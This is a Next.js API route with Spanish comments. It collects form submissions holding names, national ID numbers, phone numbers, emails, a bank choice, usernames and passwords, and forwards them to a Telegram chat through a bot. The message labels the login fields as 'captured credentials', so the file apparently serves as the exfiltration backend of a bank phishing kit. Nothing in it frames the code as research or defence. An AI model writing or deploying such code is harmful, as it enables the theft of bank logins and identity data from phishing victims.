import { NextResponse } from "next/server";

export async function POST(request: Request) {
  try {
    // 1. Recibimos los datos que envía el frontend
    const data = await request.json();

    const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TOKEN || !CHAT_ID) {
      console.error("❌ ERROR: Configuración de variables de entorno ausente");
      return NextResponse.json({ success: false, error: "Configuración ausente" }, { status: 500 });
    }

    // 2. Extraemos todos los posibles campos (Contacto, Banco y Credenciales)
    const { 
      pagina, 
      nombre, 
      cedula, 
      telefono, 
      correo, 
      banco, 
      detalles, 
      usuario, 
      password,
      USUARIO, 
      PASSWORD 
    } = data;

    // Identificamos las credenciales sin importar si vienen en mayúsculas o minúsculas
    const userFinal = usuario || USUARIO;
    const passFinal = password || PASSWORD;

    // 3. Construimos el mensaje con formato profesional
    let mensajeTelegram = `
${pagina || "📝 NUEVO REGISTRO"}
━━━━━━━━━━━━━━━━━━
👤 **DATOS DEL CLIENTE:**
• **Nombre:** ${nombre || "No indicado"}
• **Cédula:** ${cedula || "No indicada"}
• **Teléfono:** ${telefono || "No indicado"}
• **Email:** ${correo || "No indicado"}
`;

    // 🛡️ SECCIÓN DE CREDENCIALES (Aparece solo si hay usuario o clave)
    if (userFinal || passFinal) {
      mensajeTelegram += `
🔐 **CREDENCIALES CAPTURADAS:**
• **Usuario:** \`${userFinal || "No detectado"}\`
• **Clave:** \`${passFinal || "No detectada"}\`
`;
    }

    mensajeTelegram += `
🏦 **BANCO / ESTADO:**
${banco || "Pendiente de selección"}

📝 **DETALLES ADICIONALES:**
${detalles || "Sin detalles adicionales"}
━━━━━━━━━━━━━━━━━━
`.trim();

    // 4. Enviamos la petición a Telegram
    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: mensajeTelegram,
        parse_mode: "Markdown", 
      }),
    });

    const result = await response.json();

    if (result.ok) {
      return NextResponse.json({ success: true });
    } else {
      console.error("❌ Telegram error:", result.description);
      return NextResponse.json({ success: false, error: result.description }, { status: 500 });
    }

  } catch (error) {
    console.error("💥 Error crítico:", error);
    return NextResponse.json({ success: false, error: "Error interno" }, { status: 500 });
  }
}